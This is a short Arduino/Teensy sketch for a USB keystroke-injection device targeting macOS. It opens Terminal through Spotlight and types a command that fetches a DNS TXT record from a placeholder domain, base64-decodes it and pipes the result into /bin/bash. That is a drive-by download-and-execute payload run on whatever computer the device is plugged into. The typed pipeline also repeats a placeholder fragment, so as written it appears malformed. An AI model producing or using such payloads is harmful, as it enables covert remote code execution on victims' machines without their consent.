
void setup()
{
  delay(5000);
  run("terminal");
  delay(3000);
  Keyboard.print("nslookup -querytype=txt INPUT0 |");
  delay(200);
  Keyboard.print(" INPUT0 |");
  delay(200);
  Keyboard.print("grep text | cut -d \" \" -f3-");
  delay(200);
  Keyboard.print(" | tr -d \"\\\"\" | base64 -D");
  delay(200);
  Keyboard.println(" | /bin/bash");
  
}

void loop()
{
   
}

void run(char *SomeCommand){
  
  Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
  Keyboard.set_key1(KEY_SPACE);
  Keyboard.send_now();

  delay(500);
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();

  Keyboard.print(SomeCommand);
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();

  Keyboard.set_key1(0);
  Keyboard.send_now();
}

